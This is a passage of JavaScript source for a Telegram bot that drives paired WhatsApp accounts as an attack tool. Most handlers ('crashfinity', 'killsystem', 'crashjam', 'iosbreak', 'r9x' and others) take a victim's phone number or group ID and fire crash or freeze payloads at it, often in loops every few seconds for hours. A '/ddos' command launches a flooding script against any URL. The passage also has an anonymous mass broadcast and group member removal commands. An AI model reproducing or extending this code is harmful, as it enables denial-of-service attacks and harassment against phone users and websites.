                userList += `${count}. ${username}\n   📌 ID: <code>${user.id}</code>\n\n`;
                count++;
                
                if (count > 20) {
                    userList += `➕ And ${users.length - 20} more users...\n`;
                    break;
                }
            }
            
            const statsText = 
                `📊 BOT STATISTICS\n\n` +
                `┌─────────────────────┐\n` +
                `│ 👥 Total Users: ${totalUsers}\n` +
                `└─────────────────────┘\n\n` +
                userList;
            
            if (statsText.length > 4000) {
                const filePath = `./Love/users_${Date.now()}.txt`;
                fs.writeFileSync(filePath, statsText.replace(/<[^>]*>/g, ''));
                await S7.sendDocument(chatId, filePath, { caption: `📋 Full users list (${totalUsers} users)` });
                fs.unlinkSync(filePath);
            } else {
                await S7.sendMessage(chatId, statsText, { parse_mode: 'HTML' });
            }
        });
        
        // ========== HIDDEN BROADCAST COMMAND ==========
        
        SYLoVe('announce', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();
            
            if (!isAdmin(userId)) return S7.sendMessage(chatId, notauthorized);
            
            const broadcastMsg = msg.text.split(' ').slice(1).join(' ');
            
            if (!broadcastMsg) {
                return S7.sendMessage(chatId, 
                    `📢 HIDDEN BROADCAST\n\nUsage: /announce <message>\n\nExample: /announce Server maintenance at 2 AM\n\n⚠️ Users will NOT see who sent this.`,
                    { parse_mode: 'HTML' }
                );
            }
            
            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile)) {
                return S7.sendMessage(chatId, '❌ No user database found.');
            }
            
            const users = JSON.parse(fs.readFileSync(userFile));
            
            const confirmKeyboard = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '✅ YES, SEND', callback_data: `confirm_broadcast_${Date.now()}` }],
                        [{ text: '❌ CANCEL', callback_data: 'cancel_broadcast' }]
                    ]
                }
            };
            
            S7.broadcastMsg = broadcastMsg;
            S7.broadcastUsers = users;
            
            S7.sendMessage(chatId, 
                `📢 BROADCAST PREVIEW\n\nMessage: "${broadcastMsg}"\n\n👥 Total recipients: ${users.length}\n\nPress YES to send.`,
                { parse_mode: 'HTML', ...confirmKeyboard }
            );
        });
        
        // ========== ORIGINAL BUG COMMANDS (KEEP AS IS) ==========
        
        SYLoVe('crashfinity', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const targetNum = args[1];
            const s7CM = args[0].replace('/', '/').replace('.', ''); 

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || waSessions[chatId].length === 0) {
                return S7.sendMessage(chatId, '❌ you have to pair please use /reqpair to connect');
            }
            if (!targetNum) {
                return S7.sendMessage(chatId, `❌ Provide a phone number.\nExample: ${s7CM} +919876543210`);
            }
            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;
            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client = randomSession.sock;
            const senderNum = randomSession.num;
            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
                if (typeof CallLogic.crashfinity === 'function') {
                    await CallLogic.crashfinity(client, targetJid);
                } else {
                    throw new Error(`Function not found in ${s7CM}.js`);
                }
                const SYLoves = BvgSYLoVe(cleanTarget);                                
                await S7.sendPhoto(chatId, botConfig.logo, { caption: SYLoves, parse_mode: 'HTML' });
            } catch (err) {
                log('error', `${s7CM}`, err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });
       
        SYLoVe(['xgroup', 'groupui'], async (msg) => {
            try {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const s7CM = args[0].replace('/', '/').replace('.', ''); 
                const targetNum = args[1];
                const durationArg = args[2];
                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
                if (!waSessions[chatId] || waSessions[chatId].length === 0) return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect.');
                if (!targetNum || !durationArg) return S7.sendMessage(chatId, `❌ Provide a GC jid and Duration.\nExample: ${s7CM} 1236xxx@g.us 1`);
                if (!targetNum.endsWith('@g.us')) return S7.sendMessage(chatId, '❌ Invalid group JID');
                if (isNaN(durationArg)) return S7.sendMessage(chatId, '❌ Duration must be a number (Hours)');
                const targetJid = targetNum.trim();
                const hours = parseInt(durationArg);
                if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time value');
                const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
                const client = randomSession.sock;
                const senderNum = randomSession.num;
                log('command', msg.from.first_name, `Calling ${s7CM} on ${targetJid} for ${hours} hours via ${senderNum}`);
                const SYLoves = BvgSYLoVe(targetJid);
                await S7.sendPhoto(chatId, botConfig.logo, { caption: SYLoves, parse_mode: 'HTML' });
                const delayMs = 2000;
                const endTime = Date.now() + hours * 60 * 60 * 1000;
                const interval = setInterval(async () => {
                    if (Date.now() >= endTime) { clearInterval(interval); return; }
                    try { if (typeof XgcLogic.Xgc === 'function') await XgcLogic.Xgc(client, targetJid); } catch (err) {}
                }, delayMs);
            } catch (err) {
                log('error', 'xgroup', err.message);
                await S7.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe(['trashsysgp'], async (msg) => {
            try {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const s7CM = args[0].replace('/', '/').replace('.', ''); 
                const targetNum = args[1];
                const durationArg = args[2];
                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
                if (!waSessions[chatId] || waSessions[chatId].length === 0) return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect.');
                if (!targetNum || !durationArg) return S7.sendMessage(chatId, `❌ Provide a GC jid and Duration.\nExample: ${s7CM} 1236xxx@g.us 1`);
                if (!targetNum.endsWith('@g.us')) return S7.sendMessage(chatId, '❌ Invalid group JID');
                if (isNaN(durationArg)) return S7.sendMessage(chatId, '❌ Duration must be a number (Hours)');
                const targetJid = targetNum.trim();
                const hours = parseInt(durationArg);
                if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time value');
                const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
                const client = randomSession.sock;
                const senderNum = randomSession.num;
                log('command', msg.from.first_name, `Calling ${s7CM} on ${targetJid} for ${hours} hours via ${senderNum}`);
                const SYLoves = BvgSYLoVe(targetJid);
                await S7.sendPhoto(chatId, botConfig.logo, { caption: SYLoves, parse_mode: 'HTML' });
                const delayMs = 2000;
                const endTime = Date.now() + hours * 60 * 60 * 1000;
                const interval = setInterval(async () => {
                    if (Date.now() >= endTime) { clearInterval(interval); return; }
                    try { 
                        if (typeof killsystemLogic.killsystem === 'function') await killsystemLogic.killsystem(client, targetJid); 
                        await gcFrzLogic.gcFrz(client, targetJid); 
                    } catch (err) {}
                }, delayMs);
            } catch (err) {
                log('error', 'trashsysgp', err.message);
                await S7.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe(['killgc', 'groupfriz'], async (msg) => {
            try {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const s7CM = args[0].replace('/', '/').replace('.', ''); 
                const targetNum = args[1];
                const durationArg = args[2];
                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
                if (!waSessions[chatId] || waSessions[chatId].length === 0) return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect.');
                if (!targetNum || !durationArg) return S7.sendMessage(chatId, `❌ Provide a GC jid and Duration.\nExample: ${s7CM} 1236xxx@g.us 1`);
                if (!targetNum.endsWith('@g.us')) return S7.sendMessage(chatId, '❌ Invalid group JID');
                if (isNaN(durationArg)) return S7.sendMessage(chatId, '❌ Duration must be a number (Hours)');
                const targetJid = targetNum.trim();
                const hours = parseInt(durationArg);
                if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time value');
                const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
                const client = randomSession.sock;
                const senderNum = randomSession.num;
                log('command', msg.from.first_name, `Calling ${s7CM} on ${targetJid} for ${hours} hours via ${senderNum}`);
                const SYLoves = BvgSYLoVe(targetJid);
                await S7.sendPhoto(chatId, botConfig.logo, { caption: SYLoves, parse_mode: 'HTML' });
                const delayMs = 2000;
                const endTime = Date.now() + hours * 60 * 60 * 1000;
                const interval = setInterval(async () => {
                    if (Date.now() >= endTime) { clearInterval(interval); return; }
                    try { if (typeof gcFrzLogic.gcFrz === 'function') await gcFrzLogic.gcFrz(client, targetJid); } catch (err) {}
                }, delayMs);
            } catch (err) {
                log('error', 'killgc', err.message);
                await S7.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe(['crashdroid', 'killsystem'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const s7CM = args[0].replace('/', '/').replace('.', ''); 
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || waSessions[chatId].length === 0) return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
            if (args.length < 3) return S7.sendMessage(chatId, `❌ Provide a phone number.\nExample: /${s7CM} +919876543210 1`);
            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;
            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client = randomSession.sock;
            const senderNum = randomSession.num;
            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
                const SYLoves = BvgSYLoVe(cleanTarget);
                await S7.sendPhoto(chatId, botConfig.logo, { caption: SYLoves, parse_mode: 'HTML' });
                const delayMs = 2000;
                if (args[2] === 'only') {
                    const count = parseInt(args[3]);
                    if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count value');
                    let sent = 0;
                    const interval = setInterval(async () => {
                        if (sent >= count) { clearInterval(interval); return; }
                        try { await killsystemLogic.killsystem(client, targetJid); sent++; } catch (err) {}
                    }, delayMs);
                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time value');
                    const endTime = Date.now() + hours * 60 * 60 * 1000;
                    const interval = setInterval(async () => {
                        if (Date.now() >= endTime) { clearInterval(interval); return; }
                        try { await killsystemLogic.killsystem(client, targetJid); } catch (err) {}
                    }, delayMs);
                }
            } catch (err) {
                log('error', s7CM, err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe(['crashjam', 'trashsystem'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const s7CM = args[0].replace('/', '/').replace('.', ''); 
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || waSessions[chatId].length === 0) return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
            if (args.length < 3) return S7.sendMessage(chatId, `❌ Provide a phone number.\nExample: /${s7CM} +919876543210 1`);
            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;
            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client = randomSession.sock;
            const senderNum = randomSession.num;
            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
                const SYLoves = BvgSYLoVe(cleanTarget);
                await S7.sendPhoto(chatId, botConfig.logo, { caption: SYLoves, parse_mode: 'HTML' });
                const delayMs = 2000;
                if (args[2] === 'only') {
                    const count = parseInt(args[3]);
                    if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count value');
                    let sent = 0;
                    const interval = setInterval(async () => {
                        if (sent >= count) { clearInterval(interval); return; }
                        try { await crashjamLogic.crashjam(client, targetJid); sent++; } catch (err) {}
                    }, delayMs);
                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time value');
                    const endTime = Date.now() + hours * 60 * 60 * 1000;
                    const interval = setInterval(async () => {
                        if (Date.now() >= endTime) { clearInterval(interval); return; }
                        try { await crashjamLogic.crashjam(client, targetJid); } catch (err) {}
                    }, delayMs);
                }
            } catch (err) {
                log('error', s7CM, err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe('test', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const s7CM = args[0].replace('/', '/').replace('.', ''); 
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || waSessions[chatId].length === 0) return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
            if (args.length < 3) return S7.sendMessage(chatId, `❌ Provide a phone number.\nExample: /${s7CM} +919876543210 1`);
            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;
            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client = randomSession.sock;
            const senderNum = randomSession.num;
            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
                const SYLoves = BvgSYLoVe(cleanTarget);
                await S7.sendPhoto(chatId, botConfig.logo, { caption: SYLoves, parse_mode: 'HTML' });
                if (args[2] === 'only') {
                    const count = parseInt(args[3]);
                    if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count value');
                    for (let i = 0; i < count; i++) {
                        await testlogic.test(client, targetJid);
                        await testlogic.test(client, targetJid);
                        await testlogic.test(client, targetJid);
                        await testlogic.test(client, targetJid);
                    }
                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time value');
                    const endTime = Date.now() + hours * 60 * 60 * 1000;
                    while (Date.now() < endTime) {
                        await testlogic.test(client, targetJid);
                        await testlogic.test(client, targetJid);
                        await testlogic.test(client, targetJid);
                        await testlogic.test(client, targetJid);
                    }
                }
            } catch (err) {
                log('error', s7CM, err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe(['IosInvisible', 'hidenseek'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const s7CM = args[0].replace('/', '/').replace('.', ''); 
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || waSessions[chatId].length === 0) return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
            if (args.length < 3) return S7.sendMessage(chatId, `❌ Provide a phone number.\nExample: ${s7CM} +919876543210 1`);
            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;
            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client = randomSession.sock;
            const senderNum = randomSession.num;
            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
                const SYLoves = BvgSYLoVe(cleanTarget);
                await S7.sendPhoto(chatId, botConfig.logo, { caption: SYLoves, parse_mode: 'HTML' });
                const delayMs = 500;
                if (args[2] === 'only') {
                    const count = parseInt(args[3]);
                    if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count value');
                    let sent = 0;
                    const interval = setInterval(async () => {
                        if (sent >= count) { clearInterval(interval); return; }
                        try { await IosLogic.IosInvisible(client, targetJid); sent++; } catch (err) {}
                    }, delayMs);
                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time value');
                    const endTime = Date.now() + hours * 60 * 60 * 1000;
                    const interval = setInterval(async () => {
                        if (Date.now() >= endTime) { clearInterval(interval); return; }
                        try { await IosLogic.IosInvisible(client, targetJid); } catch (err) {}
                    }, delayMs);
                }
            } catch (err) {
                log('error', s7CM, err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });


        // ========== NEW BUG COMMANDS (GONEFORCE, FAMILYPROBLEM, IOSBREAK) ==========

        SYLoVe('goneforce', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const s7CM = args[0].replace('/', '/').replace('.', '');

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || waSessions[chatId].length === 0) {
                return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
            }
            if (!args[1]) {
                return S7.sendMessage(chatId, `❌ Provide a phone number.\nExample: /${s7CM} +919876543210`);
            }

            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;
            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client = randomSession.sock;
            const senderNum = randomSession.num;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);

                await goneforceLogic.lottiesPay(client, targetJid);

                const SYLoves = BvgSYLoVe(cleanTarget);
                await S7.sendPhoto(chatId, botConfig.logo, { caption: SYLoves, parse_mode: 'HTML' });
            } catch (err) {
                log('error', s7CM, err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe('familyproblem', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const s7CM = args[0].replace('/', '/').replace('.', '');

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || waSessions[chatId].length === 0) {
                return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
            }
            if (!args[1]) {
                return S7.sendMessage(chatId, `❌ Provide a phone number.\nExample: /${s7CM} +919876543210`);
            }

            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;
            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client = randomSession.sock;
            const senderNum = randomSession.num;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);

                await familyproblemLogic.CrashBulldo(client, targetJid);

                const SYLoves = BvgSYLoVe(cleanTarget);
                await S7.sendPhoto(chatId, botConfig.logo, { caption: SYLoves, parse_mode: 'HTML' });
            } catch (err) {
                log('error', s7CM, err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe('iosbreak', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const s7CM = args[0].replace('/', '/').replace('.', '');

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || waSessions[chatId].length === 0) {
                return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
            }
            if (!args[1]) {
                return S7.sendMessage(chatId, `❌ Provide a phone number.\nExample: /${s7CM} +919876543210`);
            }

            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;
            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client = randomSession.sock;
            const senderNum = randomSession.num;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);

                await iosbreakLogic.SIOSX(client, targetJid);

                const SYLoves = BvgSYLoVe(cleanTarget);
                await S7.sendPhoto(chatId, botConfig.logo, { caption: SYLoves, parse_mode: 'HTML' });
            } catch (err) {
                log('error', s7CM, err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        // ========== NEW GROUP PUBLIC COMMANDS ==========
        
        
        SYLoVe('r9x', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const s7CM = args[0].replace('/', '/').replace('.', '');
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || waSessions[chatId].length === 0) return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
            if (args.length < 3) return S7.sendMessage(chatId, `❌ Provide a phone number.\nExample: /${s7CM} +919876543210 1`);
            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;
            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client = randomSession.sock;
            const senderNum = randomSession.num;
            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
                const SYLoves = BvgSYLoVe(cleanTarget);
                await S7.sendPhoto(chatId, botConfig.logo, { caption: SYLoves, parse_mode: 'HTML' });
                const delayMs = 2000;
                if (args[2] === 'only') {
                    const count = parseInt(args[3]);
                    if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count value');
                    let sent = 0;
                    const interval = setInterval(async () => {
                        if (sent >= count) { clearInterval(interval); return; }
                        try { await R9XLogic.R9X(client, targetJid, false); sent++; } catch (err) {}
                    }, delayMs);
                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time value');
                    const endTime = Date.now() + hours * 60 * 60 * 1000;
                    const interval = setInterval(async () => {
                        if (Date.now() >= endTime) { clearInterval(interval); return; }
                        try { await R9XLogic.R9X(client, targetJid, false); } catch (err) {}
                    }, delayMs);
                }
            } catch (err) {
                log('error', s7CM, err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

SYLoVe('gcpromote', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const targetGroup = args[1];
            const targetNumber = args[2];
            
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId]?.length) return S7.sendMessage(chatId, '❌ Connect WhatsApp first. Use /reqpair');
            if (!targetGroup || !targetNumber) return S7.sendMessage(chatId, 'Usage: /gcpromote <groupid> <number>');
            if (!targetGroup.endsWith('@g.us')) return S7.sendMessage(chatId, '❌ Invalid group ID');
            
            const targetJid = `${targetNumber.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
            const sock = waSessions[chatId][0].sock;
            
            try {
                await sock.groupParticipantsUpdate(targetGroup, [targetJid], 'promote');
                S7.sendMessage(chatId, `✅ Promoted ${targetNumber} in ${targetGroup}`);
            } catch (err) {
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });
        
        SYLoVe('gcdemote', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const targetGroup = args[1];
            const targetNumber = args[2];
            
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId]?.length) return S7.sendMessage(chatId, '❌ Connect WhatsApp first.');
            if (!targetGroup || !targetNumber) return S7.sendMessage(chatId, 'Usage: /gcdemote <groupid> <number>');
            if (!targetGroup.endsWith('@g.us')) return S7.sendMessage(chatId, '❌ Invalid group ID');
            
            const targetJid = `${targetNumber.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
            const sock = waSessions[chatId][0].sock;
            
            try {
                await sock.groupParticipantsUpdate(targetGroup, [targetJid], 'demote');
                S7.sendMessage(chatId, `✅ Demoted ${targetNumber} in ${targetGroup}`);
            } catch (err) {
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });
        
        SYLoVe('gcban', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const targetGroup = args[1];
            const targetNumber = args[2];
            
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId]?.length) return S7.sendMessage(chatId, '❌ Connect WhatsApp first.');
            if (!targetGroup || !targetNumber) return S7.sendMessage(chatId, 'Usage: /gcban <groupid> <number>');
            if (!targetGroup.endsWith('@g.us')) return S7.sendMessage(chatId, '❌ Invalid group ID');
            
            const targetJid = `${targetNumber.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
            const sock = waSessions[chatId][0].sock;
            
            try {
                await sock.groupParticipantsUpdate(targetGroup, [targetJid], 'remove');
                S7.sendMessage(chatId, `✅ Removed ${targetNumber} from ${targetGroup}`);
            } catch (err) {
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });
        
        SYLoVe('gcadd', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const targetGroup = args[1];
            const targetNumber = args[2];
            
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId]?.length) return S7.sendMessage(chatId, '❌ Connect WhatsApp first.');
            if (!targetGroup || !targetNumber) return S7.sendMessage(chatId, 'Usage: /gcadd <groupid> <number>');
            if (!targetGroup.endsWith('@g.us')) return S7.sendMessage(chatId, '❌ Invalid group ID');
            
            const targetJid = `${targetNumber.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
            const sock = waSessions[chatId][0].sock;
            
            try {
                await sock.groupParticipantsUpdate(targetGroup, [targetJid], 'add');
                S7.sendMessage(chatId, `✅ Added ${targetNumber} to ${targetGroup}`);
            } catch (err) {
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });
        
        SYLoVe(['ddos', 'xxddos'], (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ').slice(1);
            
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            
            if (args.length < 2) {
                return S7.sendMessage(chatId, 'Usage: /ddos <url> <time>\nExample: /ddos https://example.com 60');
            }
            
            const target = args[0];
            const time = args[1];
            
            if (!target.startsWith('http://') && !target.startsWith('https://')) {
                return S7.sendMessage(chatId, '❌ Please provide a valid URL');
            }
            
            const attackMsg = `🔥 DDOS ATTACK 🔥\n\n⚡ Target: ${target}\n⏱️ Time: ${time} seconds\n💀 Status: ATTACKING`;
            
            S7.sendPhoto(chatId, botConfig.logo, { caption: attackMsg, parse_mode: 'HTML' }).catch(() => {
                S7.sendMessage(chatId, attackMsg, { parse_mode: 'HTML' });
            });
            
            spawn(`node ./SY/ddos.js ${target} ${time}`, { shell: true, stdio: 'ignore', detached: true });
        });
        
        // ========== OTHER ORIGINAL COMMANDS (KEEP AS IS) ==========
        
        SYLoVe('setbot', async (msg) => {
            const chatId = msg.chat.id.toString();
            if (tokenData && tokenData.owner !== chatId) return S7.sendMessage(chatId, '❌ You are not the owner of this bot.');
            
            const messageText = msg.text || msg.caption || '';
            const args = messageText.split(' ');
            const type = args[1]?.toLowerCase();
            let value = args.slice(2).join(' ');
            
            if (type === 'logo' && msg.photo) value = msg.photo[msg.photo.length - 1].file_id;
            else if (type === 'logo' && msg.reply_to_message && msg.reply_to_message.photo) value = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1].file_id;
            
            if (!type || !value) return S7.sendMessage(chatId, '⚙️ Bot Customization\n\n/setbot name <Name>\n/setbot logo <Photo>\n/setbot channel <Link>\n/setbot group <Link>\n/setbot contact <@User>\n\n/setbot protection on/off\n/setbot channelid <ID>\n/setbot groupid <ID>');
            
            db = getDB();
            let tIndex = db.tokens.findIndex(t => t.token === token);
            if (tIndex === -1) return S7.sendMessage(chatId, '❌ Error: Bot not found in database.');
            if (!db.tokens[tIndex].config) db.tokens[tIndex].config = {};
            
            if (type === 'channel') db.tokens[tIndex].config.channel = value;
            else if (type === 'group') db.tokens[tIndex].config.group = value;
            else if (type === 'logo') db.tokens[tIndex].config.logo = value;
            else if (type === 'name') db.tokens[tIndex].config.botName = value;
            else if (type === 'contact') db.tokens[tIndex].config.ownerContact = value;
            else if (type === 'protection') db.tokens[tIndex].config.protectionState = (value.toLowerCase() === 'on');
            else if (type === 'channelid') db.tokens[tIndex].config.channelId = value;
            else if (type === 'groupid') db.tokens[tIndex].config.groupId = value;
            else return S7.sendMessage(chatId, '❌ Invalid type.');
            
            saveDB(db);
            await S7.sendMessage(chatId, `✅ ${type} updated! Restarting bot...`, { parse_mode: 'HTML' });
            if (activeBots[token]) await activeBots[token].stopPolling();
            startSYloveBot(token);
        });
        
        SYLoVe('delbot', async (msg) => {
            const chatId = msg.chat.id.toString();
            let db = getDB();
            const botData = db.tokens.find(t => t.owner === chatId);
            if (!botData) return S7.sendMessage(chatId, '❌ You do not have a hosted bot.');
